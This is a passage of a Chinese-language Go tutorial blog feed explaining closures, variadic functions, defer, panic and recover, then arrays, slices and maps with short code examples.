class="line">&#125;</span><br></pre></td></tr></table></figure><p>例子证明，函数值不仅仅是一串代码，还记录了状态。在<code>solveNQueens</code>中定义的匿名内部函数可以访问和更新<code>solveNQueens</code>中的局部变量，这意味着匿名函数和<code>solveNQueens</code>中，存在变量引用。这就是函数值属于引用类型和函数值不可比较的原因。Go使用<strong>闭包（closures）<strong>技术实现函数值，Go程序员也把函数值叫做</strong>闭包</strong>。</p><p>通过这个例子，我们看到变量的生命周期不由它的作用域决定：<code>solveNQueens</code>返回后，变量<code>res</code>仍然隐式的存在于<code>solveNQueens</code>中（前提是main函数还引用着变量）。</p><h4 id="警告捕获迭代变量"><a class="markdownIt-Anchor" href="#警告捕获迭代变量"></a> 警告：捕获迭代变量</h4><p>阅读以下代码，这是一个Go词法作用域的陷阱。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rmdirs []<span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">for</span> _, d := <span class="keyword">range</span> tempDirs() &#123;</span><br><span class="line">dir := d <span class="comment">// <span class="doctag">NOTE:</span> necessary!</span></span><br><span class="line">os.MkdirAll(dir, <span class="number">0755</span>) <span class="comment">// creates parent directories too</span></span><br><span class="line">rmdirs = <span class="built_in">append</span>(rmdirs, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">os.RemoveAll(dir)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...do some work…</span></span><br><span class="line"><span class="keyword">for</span> _, rmdir := <span class="keyword">range</span> rmdirs &#123;</span><br><span class="line">rmdir() <span class="comment">// clean up</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//code below is wrong</span></span><br><span class="line"><span class="keyword">var</span> rmdirs []<span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">for</span> _, dir := <span class="keyword">range</span> tempDirs() &#123;</span><br><span class="line">os.MkdirAll(dir, <span class="number">0755</span>)</span><br><span class="line">rmdirs = <span class="built_in">append</span>(rmdirs, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">os.RemoveAll(dir) <span class="comment">// <span class="doctag">NOTE:</span> incorrect!</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题的原因在于循环变量的作用域。在上面的程序中，for循环语句引入了新的词法块，循环变量dir在这个词法块中被声明。在该循环中生成的所有函数值都共享相同的循环变量。需要注意，函数值中记录的是循环变量的内存地址，而不是循环变量某一时刻的值。以dir为例，后续的迭代会不断更新dir的值，当删除操作执行时，for循环已完成，dir中存储的值等于最后一次迭代的值。这意味着，每次对os.RemoveAll的调用删除的都是相同的目录。</p><p>为了解决这个问题，我们会引入一个与循环变量同名的局部变量，作为循环变量的副本。虽然这看起来很奇怪，但却很有用。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> _, dir := <span class="keyword">range</span> tempDirs() &#123;</span><br><span class="line">dir := dir <span class="comment">// declares inner dir, initialized to outer dir</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="可变参数"><a class="markdownIt-Anchor" href="#可变参数"></a> 可变参数</h3><p>参数数量可变的函数称为可变参数函数。典型的例子就是fmt.Printf和类似函数。Printf首先接收一个必备的参数，之后接收任意个数的后续参数。</p><p>在声明可变参数函数时，需要在参数列表的最后一个参数类型之前加上省略符号“…”，这表示该函数会接收任意数量的该类型参数。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(vals ...<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">     total := <span class="number">0</span></span><br><span class="line">     <span class="keyword">for</span> _, val := <span class="keyword">range</span> vals &#123;</span><br><span class="line">     total += val</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> total</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sum函数返回任意个int型参数的和。在函数体中，vals被看作是类型为[] int的切片。</p><p>可变参数函数经常被用于格式化字符串。下面的errorf函数构造了一个以行号开头的，经过格式化的错误信息。函数名的后缀f是一种通用的命名规范，代表该可变参数函数可以接收Printf风格的格式化字符串。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">errorf</span><span class="params">(linenum <span class="type">int</span>, format <span class="type">string</span>, args ...<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">     fmt.Fprintf(os.Stderr, <span class="string">&quot;Line %d: &quot;</span>, linenum)</span><br><span class="line">     fmt.Fprintf(os.Stderr, format, args...)</span><br><span class="line">     fmt.Fprintln(os.Stderr)</span><br><span class="line">&#125;</span><br><span class="line">linenum, name := <span class="number">12</span>, <span class="string">&quot;count&quot;</span></span><br><span class="line">errorf(linenum, <span class="string">&quot;undefined: %s&quot;</span>, name) <span class="comment">// &quot;Line 12: undefined: count&quot;</span></span><br></pre></td></tr></table></figure><h3 id="deferred函数"><a class="markdownIt-Anchor" href="#deferred函数"></a> Deferred函数</h3><p>只需要在调用普通函数或方法前加上关键字defer，就完成了defer所需要的语法。当执行到该条语句时，函数和参数表达式得到计算，但直到<strong>包含该defer语句的函数</strong>执行完毕时，defer后的函数才会被执行，不论包含defer语句的函数是通过return正常结束，还是由于panic导致的异常结束。你可以在一个函数中执行多条defer语句，它们的执行顺序与声明顺序相反。</p><p>defer语句经常被用于处理成对的操作，如打开、关闭、连接、断开连接、加锁、释放锁。通过defer机制，不论函数逻辑多复杂，都能保证在任何执行路径下，资源被释放。释放资源的defer应该直接跟在请求资源的语句后。</p><p>比如对文件的操作：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ioutil</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReadFile</span><span class="params">(filename <span class="type">string</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">     f, err := os.Open(filename)</span><br><span class="line">     <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">defer</span> f.Close()</span><br><span class="line">     <span class="keyword">return</span> ReadAll(f)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>f.Close()</code>方法会在<code>ReadFile</code>函数即将<code>return</code>或者产生<code>Panic</code>前执行，大大减小了Go函数的维护成本。</p><p>本质上<code>defer</code>就是延迟函数直到包含其的“大函数”执行完毕后再执行被延迟的语句，不管该“大函数”是通过<code>return</code>正常返回还是<code>Panic</code>异常退出。通过使用<code>defer</code>，可以很方便的维护一些对资源的开闭操作处理。但有时候<code>defer</code>也会导致一些意想不到的错误，此时还是需要用传统的<code>f.Close</code>方法来维护。</p><h3 id="panic异常"><a class="markdownIt-Anchor" href="#panic异常"></a> Panic异常</h3><p>Go的类型系统会在编译时捕获很多错误，但有些错误只能在运行时检查，如数组访问越界、空指针引用等。这些运行时错误会引起panic异常。</p><p>一般而言，当panic异常发生时，程序会中断运行，并立即执行在该<strong>goroutine</strong>（可以先理解成线程，在第8章会详细介绍）中被延迟的函数（defer 机制）。随后，程序崩溃并输出日志信息。日志信息包括panic value和函数调用的堆栈跟踪信息。panic value通常是某种错误信息。对于每个goroutine，日志信息中都会有与之相对的，发生panic时的函数调用堆栈跟踪信息。通常，我们不需要再次运行程序去定位问题，日志信息已经提供了足够的诊断依据。因此，在我们填写问题报告时，一般会将panic异常和日志信息一并记录。</p><p>直接调用内置的panic函数也会引发panic异常；panic函数接受任何值作为参数。当某些不应该发生的场景发生时，我们就应该调用panic。比如，当程序到达了某条逻辑上不可能到达的路径：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> s := suit(drawCard()); s &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Spades&quot;</span>: <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Hearts&quot;</span>: <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Diamonds&quot;</span>: <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Clubs&quot;</span>: <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">     <span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;invalid suit %q&quot;</span>, s)) <span class="comment">// Joker?</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于panic会引起程序的崩溃，因此panic一般用于严重错误，如程序内部的逻辑不一致。所以对于大部分漏洞，我们应该使用Go提供的错误机制，而不是panic，尽量避免程序的崩溃。在健壮的程序中，任何可以预料到的错误，如不正确的输入、错误的配置或是失败的I/O操作都应该被优雅的处理，最好的处理方式，就是使用Go的错误机制。</p><h3 id="recover捕获异常"><a class="markdownIt-Anchor" href="#recover捕获异常"></a> Recover捕获异常</h3><p>通常来说，不应该对panic异常做任何处理，但有时，也许我们可以从异常中恢复，至少我们可以在程序崩溃前，做一些操作。举个例子，当web服务器遇到不可预料的严重问题时，在崩溃前应该将所有的连接关闭；如果不做任何处理，会使得客户端一直处于等待状态。如果web服务器还在开发阶段，服务器甚至可以将异常信息反馈到客户端，帮助调试。</p><p>如果在deferred函数中调用了内置函数recover，并且定义该defer语句的函数发生了panic异常，recover会使程序从panic中恢复，并返回panic value。导致panic异常的函数不会继续运行，但能正常返回。在未发生panic时调用recover，recover会返回nil。</p><p>一个示例程序如下</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Parse</span><span class="params">(input <span class="type">string</span>)</span></span> (s *Syntax, err <span class="type">error</span>) &#123;</span><br><span class="line">     <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">         <span class="keyword">if</span> p := <span class="built_in">recover</span>(); p != <span class="literal">nil</span> &#123;</span><br><span class="line">            err = fmt.Errorf(<span class="string">&quot;internal error: %v&quot;</span>, p)</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;()</span><br><span class="line">     <span class="comment">// ...parser...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安全的做法是有选择性的recover。换句话说，只恢复应该被恢复的panic异常，此外，这些异常所占的比例应该尽可能的低。为了标识某个panic是否应该被恢复，我们可以将panicvalue设置成特殊类型。在recover时对panic value进行检查，如果发现panic value是特殊类型，就将这个panic作为error处理，如果不是，则按照正常的panic进行处理。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> bailout <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"> <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">     <span class="keyword">switch</span> p := <span class="built_in">recover</span>(); p &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="literal">nil</span>: <span class="comment">// no panic</span></span><br><span class="line">         <span class="keyword">case</span> bailout&#123;&#125;: <span class="comment">// &quot;expected&quot; panic</span></span><br><span class="line">         err = fmt.Errorf(<span class="string">&quot;multiple title elements&quot;</span>)</span><br><span class="line">         <span class="keyword">default</span>:</span><br><span class="line">         <span class="built_in">panic</span>(p) <span class="comment">// unexpected panic; carry on panicking</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;()</span><br></pre></td></tr></table></figure><p>不加区分的恢复是危险的，因为无法保证包级变量的状态和我们预期的一致。</p><p>有些情况下，我们无法恢复。某些致命错误会导致Go在运行时终止程序，如内存不足。</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/CE22E4EE388D674AB24D5CE15D445580.jpg" alt="CE22E4EE388D674AB24D5CE15D445580" /></p>]]></content>
      
      
      <categories>
          
          <category> Go!Go!Go! </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go修炼手册——复合数据类型</title>
      <link href="/posts/f4533fd3ef81/"/>
      <url>/posts/f4533fd3ef81/</url>
      
        <content type="html"><![CDATA[<h2 id="复合数据类型"><a class="markdownIt-Anchor" href="#复合数据类型"></a> <strong>复合数据类型</strong></h2><p>在本章，我们将讨论复合数据类型，它是以不同的方式组合基本类型而构造出来的复合数据类型。我们主要讨论四种类型——数组、slice、map和结构体</p><p>数组和结构体是聚合类型；它们的值由许多元素或成员字段的值组成。数组是由同构的元素组成——每个数组元素都是完全相同的类型；结构体则是由异构的元素组成的。数组和结构体都是有固定内存大小的数据结构。相比之下，slice和map则是动态的数据结构，它们将根据需要动态增长。</p><h3 id="数组array"><a class="markdownIt-Anchor" href="#数组array"></a> 数组/array</h3><p>数组是一个由<strong>固定长度</strong>的<strong>特定类型</strong>元素组成的序列，一个数组可以由零个或多个元素组成。因为数组的长度固定，所以在Go中很少使用数组，而<strong>更多的使用长度动态的slice切片</strong>。</p><p>默认情况下，数组的每个元素都被初始化为元素类型对应的零值。</p><p>在数组字面值中，如果在数组的长度位置出现的是“…”省略号，则表示数组的长度是根据初始化值的个数来计算。（在C中则是直接省略…）</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> q [<span class="number">3</span>]<span class="type">int</span> = [<span class="number">3</span>]<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">q := [...]<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure><p>数组的长度是数组类型的一个组成部分，因此[3]int和[4]int是两种不同的数组类型。数组的长度必须是常量或者常量表达式（C中也允许常量表达式，但新标准中也允许变量表达式，即变长数组），因为数组的长度需要在编译阶段确定。如果需要用到变量确定数组长度，应该选择长度动态的slice。</p><p>数组也可以用于比较。对数组可以使用<code>=</code>和<code>!=</code>，此时数组会逐个比较元素是否相等。</p><p>当调用一个函数的时候，函数的每个调用参数将会被赋值给函数内部的参数变量，所以函数参数变量接收的是一个复制的副本，并不是原始调用的变量。因为函数参数传递的机制导致传递大的数组类型将是低效的，并且对数组参数的任何的修改都是发生在复制的数组上，并不能直接修改调用时原始的数组变量。在这个方面，Go语言对待数组的方式和其它很多编程语言不同，<strong>其它编程语言可能会隐式地将数组作为引用或指针对象传入被调用的函数</strong>。</p><blockquote><p>Go语言中的数组是<strong>值类型</strong>，不是<strong>引用类型</strong>。这意味着当你把一个数组赋值给另一个数组或者将数组作为函数参数传递时，实际上是在复制整个数组。所以，如果你在函数内部修改了数组的元素，这些修改不会影响到原始数组。</p><p>这与C语言（以及许多其他语言）的行为不同，C语言中数组在函数调用时默认以指针的形式传递，所以函数内部对数组的修改会影响到原始数组。</p><p>如果你想在Go语言中实现类似的行为，你需要使用切片（slice）或者显式地传递数组的指针。切片在内部存储了对底层数组的引用，所以如果你修改了切片的元素，这些修改会影响到底层数组。例如：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">modifySlice</span><span class="params">(s []<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">s[<span class="number">0</span>] = <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">modifySlice(a)</span><br><span class="line">fmt.Println(a) <span class="comment">// 输出 [100 2 3]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的例子中，<code>modifySlice</code>函数修改了切片<code>s</code>的第一个元素。这个修改也影响到了原始切片<code>a</code>。</p></blockquote><p>虽然通过指针来传递数组参数是高效的，而且也允许在函数内部修改数组的值，但是数组依然是僵化的类型，因为数组的类型包含了僵化的长度信息。上面的zero函数并不能接收指向[16]byte类型数组的指针，而且也没有任何添加或删除数组元素的方法。由于这些原因，除了像SHA256这类需要处理特定大小数组的特例外，数组依然很少用作函数参数；相反，我们一般使用slice来替代数组。</p><h3 id="切片slice"><a class="markdownIt-Anchor" href="#切片slice"></a> 切片/slice</h3><p>Slice（切片）代表变长的序列，序列中每个元素都有相同的类型。一个slice类型一般写作[]T，其中T代表slice中元素的类型；slice的语法和数组很像，只是没有固定长度而已。</p><p>slice是一个轻量级的数据结构，提供了访问数组子序列（或者全部）元素的功能，而且slice的底层确实引用一个数组对象。一个slice由三个部分构成：<strong>指针、长度和容量</strong>。指针指向第一个slice元素对应的底层数组元素的地址，要注意的是slice的第一个元素并不一定就是数组的第一个元素。长度对应slice中元素的数目；长度不能超过容量，容量一般是从slice的开始位置到底层数据的结尾位置。内置的len和cap函数分别返回slice的长度和容量。</p><p>当slice的长度超过容量时，Go会对切片进行扩容，一般来说可能会把底层数组的容量扩张到原来的两倍然后将元素复制过去。通过内存的预分配来减少内存管理的时间。</p><p>因为slice值包含指向第一个slice元素的指针，因此向函数传递slice将允许在函数内部修改底层数组的元素。换句话说，复制一个slice只是对底层的数组创建了一个新的slice别名。</p><p>要注意的是slice类型的变量s和数组类型的变量a的初始化语法的差异。slice和数组的字面值语法很类似，它们都是用花括弧包含一系列的初始化元素，但是对于slice并没有指明序列的长度。这会隐式地创建一个合适大小的数组，然后slice的指针指向底层的数组。</p><p>和数组不同的是，slice之间不能比较，因此我们不能使用==操作符来判断两个slice是否含有全部相等元素。不过标准库提供了高度优化的bytes.Equal函数来判断两个<strong>字节型</strong>slice是否相等（[]byte），但是对于其他类型的slice，我们必须自己展开每个元素进行比较：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">equal</span><span class="params">(x, y []<span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="built_in">len</span>(y) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span> i := <span class="keyword">range</span> x &#123;</span><br><span class="line">     <span class="keyword">if</span> x[i] != y[i] &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>slice唯一合法的比较是与<code>nil</code>进行比较。</p><p>一个零值的slice等于nil。一个nil值的slice并没有底层数组。一个nil值的slice的长度和容量都是0，但是也有非nil值的slice的长度和容量也是0的。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s []<span class="type">int</span> <span class="comment">// len(s) == 0, s == nil</span></span><br><span class="line">s = <span class="literal">nil</span> <span class="comment">// len(s) == 0, s == nil</span></span><br><span class="line">s = []<span class="type">int</span>(<span class="literal">nil</span>) <span class="comment">// len(s) == 0, s == nil</span></span><br><span class="line">s = []<span class="type">int</span>&#123;&#125; <span class="comment">// len(s) == 0, s != nil</span></span><br><span class="line"><span class="comment">//第一个和第四个切片的区别在于，第一个切片是一个零值切片，而第四个切片是一个空切片。</span></span><br></pre></td></tr></table></figure><p>内置的make函数创建一个指定元素类型、长度和容量的slice。容量部分可以省略，在这种情况下，容量将等于长度。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="built_in">make</span>([]T, <span class="built_in">len</span>)</span><br><span class="line"><span class="built_in">make</span>([]T, <span class="built_in">len</span>, <span class="built_in">cap</span>) <span class="comment">// same as make([]T, cap)[:len]</span></span><br></pre></td></tr></table></figure><h4 id="append函数"><a class="markdownIt-Anchor" href="#append函数"></a> append函数</h4><p>slice内置一个append函数管理切片，向切片添加元素。append函数底层管理slice的操作比较复杂，我们不知道append函数是否导致了内存的重新分配，也不知道新的slice是否和旧的slice共享一片内存空间。</p><p>append函数可以向切片追加一个或多个元素，甚至再追加一个slice。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x []<span class="type">int</span></span><br><span class="line">x = <span class="built_in">append</span>(x, <span class="number">1</span>)</span><br><span class="line">x = <span class="built_in">append</span>(x, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">x = <span class="built_in">append</span>(x, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line">x = <span class="built_in">append</span>(x, x...) <span class="comment">// append the slice x</span></span><br><span class="line"><span class="comment">//这里的...代表展开x切片，否则意味着试图向切片中追加切片而不是切片的元素</span></span><br><span class="line">fmt.Println(x) <span class="comment">// &quot;[1 2 3 4 5 6 1 2 3 4 5 6]&quot;</span></span><br></pre></td></tr></table></figure><p>需要记住尽管底层数组的元素是间接访问的，但是slice对应结构体本身的指针、长度和容量部分是直接访问的。要更新这些信息需要像上面例子那样一个显式的赋值操作。从这个角度看，slice并不是一个纯粹的引用类型，它实际上是一个类似下面结构体的聚合类型：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> IntSlice <span class="keyword">struct</span> &#123;</span><br><span class="line"> ptr *<span class="type">int</span></span><br><span class="line"> <span class="built_in">len</span>, <span class="built_in">cap</span> <span class="type">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="slice的技巧"><a class="markdownIt-Anchor" href="#slice的技巧"></a> slice的技巧</h4><p>可以编写一个函数过滤slice中的空值。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">nonempty</span><span class="params">(strings []<span class="type">string</span>)</span></span> []<span class="type">string</span> &#123;</span><br><span class="line">     out := strings[:<span class="number">0</span>] <span class="comment">// zero-length slice of original</span></span><br><span class="line">         <span class="keyword">for</span> _, s := <span class="keyword">range</span> strings &#123;</span><br><span class="line">             <span class="keyword">if</span> s != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">                out = <span class="built_in">append</span>(out, s)</span><br><span class="line">             &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> out</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这类算法可以用来实现对slice的过滤和相同项的合并。下面这个算法就实现了对slice相邻元素的合并。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">merge</span><span class="params">(strings []<span class="type">string</span>)</span></span> []<span class="type">string</span> &#123;</span><br><span class="line">     out := strings[:<span class="number">0</span>] <span class="comment">// zero-length slice of original</span></span><br><span class="line">         <span class="keyword">for</span> _, s := <span class="keyword">range</span> strings &#123;</span><br><span class="line">             <span class="keyword">if</span> <span class="built_in">len</span>(out)==<span class="number">0</span> || s != out[<span class="built_in">len</span>(out)<span class="number">-1</span>] &#123;</span><br><span class="line">                out = <span class="built_in">append</span>(out, s)</span><br><span class="line">             &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> out</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还可以用slice来模拟一个栈。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">stack := <span class="built_in">append</span>(stack,v) <span class="comment">// push v</span></span><br><span class="line">top := stack[<span class="built_in">len</span>(stack)<span class="number">-1</span>] <span class="comment">// top of stack</span></span><br><span class="line">stack := stack[:<span class="built_in">len</span>(stack<span class="number">-1</span>)] <span class="comment">// pop</span></span><br><span class="line">stack := <span class="built_in">append</span>(stack[:i],stack[i+<span class="number">1</span>:]...) <span class="comment">//remove stack[i] 虽然这好像不是栈的特性了</span></span><br></pre></td></tr></table></figure><p>当然，你也可以很方便的实现一个队列。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">queue = <span class="built_in">append</span>(queue, <span class="number">1</span>) <span class="comment">// enqueue</span></span><br><span class="line">front := queue[<span class="number">0</span>] <span class="comment">// front</span></span><br><span class="line">queue = queue[<span class="number">1</span>:] <span class="comment">// dequeue</span></span><br></pre></td></tr></table></figure><h3 id="哈希表map"><a class="markdownIt-Anchor" href="#哈希表map"></a> 哈希表/Map</h3><p>哈希表是一种巧妙并且实用的数据结构。它是一个无序的key/value对的集合，其中所有的key都是不同的，然后通过给定的key可以在常数时间复杂度内检索、更新或删除对应的value。</p><p>很多现代语言都内置了哈希表，比如Python的<code>dict</code>，PHP的<code>array</code>（没错PHP的数组底层其实是哈希表），Java的<code>HashMap</code>等。</p><p>Go的map就是对一个哈希表的<strong>引用</strong>，其实可以简单的视为一个键值对的储存，也就是键名索引是任意数据类型的数组。但是键名Key对应的数据类型必须是可以用<code>==</code>比较的，因为这样才可以用测试key相等来判断键值对是否存在。</p><p>内置的make函数可以创建一个map，也可以用其他的方法显示声明。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ages := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>) <span class="comment">// mapping from strings to ints</span></span><br><span class="line"></span><br><span class="line">ages := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;</span><br><span class="line"> <span class="string">&quot;alice&quot;</span>: <span class="number">31</span>,</span><br><span class="line"> <span class="string">&quot;charlie&quot;</span>: <span class="number">34</span>, &#125;</span><br><span class="line"></span><br><span class="line">ages := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line">ages[<span class="string">&quot;alice&quot;</span>] = <span class="number">31</span></span><br><span class="line">ages[<span class="string">&quot;charlie&quot;</span>] = <span class="number">34</span></span><br></pre></td></tr></table></figure><p>使用内置的delete函数可以删除元素：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="built_in">delete</span>(ages, <span class="string">&quot;alice&quot;</span>) <span class="comment">// remove element ages[&quot;alice&quot;]</span></span><br></pre></td></tr></table></figure><p>这些操作是安全的，即使这些元素不在map中也没有关系；如果一个查找失败将返回value类型对应的零值。但是有时候可能需要知道对应的元素是否真的是在map之中。例如，如果元素类型是一个数字，你可能需要区分一个已经存在的0，和不存在而返回零值的0，可以像下面这样测试：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">age, ok := ages[<span class="string">&quot;bob&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> !ok &#123; <span class="comment">/* &quot;bob&quot; is not a key in this map; age == 0. */</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> age, ok := ages[<span class="string">&quot;bob&quot;</span>]; !ok &#123; <span class="comment">/* ... */</span> &#125;</span><br></pre></td></tr></table></figure><p>在这种场景下，map的下标语法将产生两个值；第二个是一个布尔值，用于报告元素是否真的存在。布尔变量一般命名为ok，特别适合马上用于if条件判断部分。</p><p>Map的迭代顺序是不确定的，并且不同的哈希函数实现可能导致不同的遍历顺序。在实践中，遍历的顺序是随机的，每一次遍历的顺序都不相同。这是故意的，每次都使用随机的遍历顺序可以强制要求程序不会依赖具体的哈希函数实现。如果要按顺序遍历key/value对，我们必须显式地对key进行排序，可以使用sort包的Strings函数对字符串slice进行排序。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 提取 map 的键</span></span><br><span class="line">keys := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(m))</span><br><span class="line"><span class="keyword">for</span> k := <span class="keyword">range</span> m &#123;</span><br><span class="line">keys = <span class="built_in">append</span>(keys, k)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对键进行排序</span></span><br><span class="line">sort.Strings(keys)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按照排序后的键的顺序遍历 map</span></span><br><span class="line"><span class="keyword">for</span> _, k := <span class="keyword">range</span> keys &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s: %d\n&quot;</span>, k, m[k])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Go 语言中的 <code>map</code> 类型的遍历顺序是不确定的，这是由 Go 的设计者有意为之的。这种设计有几个主要的原因：</p><ol><li><strong>防止程序员依赖特定的遍历顺序</strong>：如果 <code>map</code> 的遍历顺序是固定的，程序员可能会依赖这个特性来编写代码。然而，这种依赖是不安全的，因为 <code>map</code> 的实现可能会在未来的版本中改变，导致遍历顺序发生变化。通过使遍历顺序不确定，Go 的设计者强制程序员编写不依赖遍历顺序的代码。</li><li><strong>提高性能</strong>：在某些情况下，随机的遍历顺序可以提高 <code>map</code> 的性能。例如，如果所有的键都被插入到同一个哈希桶中，固定的遍历顺序可能会导致性能下降。通过使遍历顺序随机，可以避免这种情况。</li><li><strong>避免安全问题</strong>：在某些情况下，固定的遍历顺序可能会导致安全问题。例如，攻击者可能会利用固定的遍历顺序来预测哈希函数的行为，从而进行哈希碰撞攻击。通过使遍历顺序随机，可以防止这种攻击。</li></ol></blockquote><p>map类型的零值是nil，也就是没有引用任何哈希表。</p><p>map上的大部分操作，包括查找、删除、len和range循环都可以安全工作在nil值的map上，它们的行为和一个空的map类似。但是向一个nil值的map存入元素将导致一个panic异常。在向map存数据前必须先创建map。</p><p>有时候我们需要一个map或set的key是slice类型，但是map的key必须是可比较的类型，但是slice并不满足这个条件。不过，我们可以通过两个步骤绕过这个限制。第一步，定义一个辅助函数k， 将slice转为map对应的string类型的key，确保只有x和y相等时k(x) == 